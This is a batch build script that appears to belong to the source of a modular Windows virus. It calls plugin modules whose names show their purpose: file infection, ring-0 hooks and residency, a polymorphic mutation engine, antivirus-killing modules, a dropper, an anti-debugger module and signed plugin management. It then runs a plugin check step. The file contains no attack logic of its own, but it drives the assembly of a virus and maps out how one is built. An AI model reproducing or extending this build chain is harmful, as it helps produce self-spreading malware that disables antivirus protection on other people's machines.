   @echo off

   call _evlist

   ::COMMON
   call plugin loader
   call plugin system
   call plugin k32man
   call plugin memory
   call plugin pentry
   call plugin infect1
   call plugin extman
   call plugin thread

   ::RING0
   call plugin ring0
   call plugin tsr
   call plugin ifshan
   call plugin ifscall
   call plugin r0io
   call plugin uncall

   ::RING3
   call plugin perproc
   call plugin unprot
   call plugin recserch
   call plugin r3io
   call plugin infmanx

   ::PLUGIN MANAGEMENT
   call plugin plugman
   call plugin addpgn
   call plugin rsalib
   call plugin rsakey
   call plugin addpgnx
   call plugin addpgnu

   ::PERVERTORS
   call plugin random
   call plugin lde32
   call plugin pervert

   ::ADDITIONAL
   call plugin util
   call plugin killavxd
   call plugin pecsum
   call plugin arclib
   call plugin dropper
   call plugin droprun
   call plugin selfcorr
   call plugin rxio
   call plugin badfile
   call plugin fastname

   call plugin maindmk
   call plugin regscan
   call plugin explorer
   call plugin pgncont
   call plugin maind
   call plugin mainst
   call plugin dpgn
   call plugin dpgndat
   call plugin aavkill
   call plugin aav

   call plugin iohooker
   call plugin iodaemon
   call plugin ioavfilt
   call plugin vxcw

   call plugin music
   call plugin effect
   call plugin volume

   call plugin cwtest
   call plugin alredy
   call plugin r0prot
   call plugin killer
   call plugin walker

   ::::::::::::::::::::::::::::::call plugin iolog
   ::::::::::::::::::::::::::::::call plugin nop
   ::::::::::::::::::::::::::::::call plugin beep
   ::::::::::::::::::::::::::::::call plugin msgbox
   ::::::::::::::::::::::::::::::call plugin test

   call plugin fuckice
   call plugin debug

   checkpgn >checkpgn.rep
   if errorlevel 2 goto error
   if errorlevel 1 goto warning
   goto exit
   :warning
   echo ***Warnings***: see CHECKPGN.REP for details
   goto exit
   :error
   echo ***ERRORs***: see CHECKPGN.REP for details
   :exit
